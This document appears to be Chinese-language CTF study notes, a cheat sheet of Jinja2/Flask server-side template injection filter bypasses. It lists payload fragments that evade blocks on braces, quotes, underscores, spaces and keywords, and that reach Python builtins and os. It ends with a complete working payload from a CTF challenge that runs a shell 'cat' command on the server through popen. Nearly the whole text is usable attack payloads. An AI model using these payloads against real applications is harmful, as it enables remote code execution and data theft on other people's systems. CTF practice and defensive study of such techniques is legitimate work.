# 常见绕过手法
	- `{{`
		- `{% if ... %}1{% endif %}`
	- 关键字
		- `{{""["\x5f\x5fclass\x5f\x5f"]}}`
	- 引号
		- `(app.__doc__|list()).pop(102)|string()`
		- `dict(buil=aa,tins=dd)|join()`
		- `["a"]`可以用`[a]`代替？
	- `+`
		- `~`
		- `__add__`
		- `"a""b"`
	- 下划线
		- `config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3)`
		- `lipsum|escape|batch(22)|list|first|last`
	- 空格
		- `config|string()|list()|attr(dict(p=aa,op=bb)|join())(7)`
	- 斜杠
		- `config|string()|list()|attr(dict(p=aa,op=bb)|join())(279)`
	- `%`
		- `(()|safe).__doc__`里面有
	- 拼接字符串
		- `|replace('', 'b', count=1)`
	- 常见获取mro的方式被禁止
		- `namespace.mro()`
	- `__import__`
		- `__loader__.load_module("os")`
	- `__mro__`
		- `__bases__`
	- `__globals__`
		- python高版本直接使用`lipsum.__builtins__`或者`g.pop.__builtins__`拿builtins
- # 利用 request 对象绕过
	- 题目: Confusion1
	- ```
	  http://111.200.241.244:59576/a.php/{{''[request.args.clas][request.args.mo][2][request.args.sub]()[230][request.args.in][request.args.g1+request.args.g2][request.args.o+request.args.s][request.args.po+request.args.pen](request.args.cmon)[request.args.re+request.args.ad]()}}
	  ?clas=__class__
	  &mo=__mro__
	  &sub=__subclasses__
	  &in=__init__
	  &g1=__global
	  &g2=s__
	  &po=po
	  &pen=pen
	  &o=o
	  &s=s
	  &re=re
	  &ad=ad
	  &cmon=c'at' /opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt
	  ```